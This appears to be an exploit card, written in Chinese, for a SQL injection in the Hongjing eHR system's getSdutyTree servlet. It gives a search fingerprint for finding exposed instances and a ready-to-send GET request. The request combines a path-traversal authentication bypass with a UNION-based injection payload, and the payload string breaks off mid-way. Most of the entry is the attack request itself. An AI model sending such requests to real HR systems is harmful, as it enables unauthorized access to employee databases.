# 宏景eHRsdutygetSdutyTreeSQL注入漏洞

- **系统**：宏景eHRsdutygetSdutyTree　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BC`
- **预期**：400　|　<?xml version=”1.0”
或
text=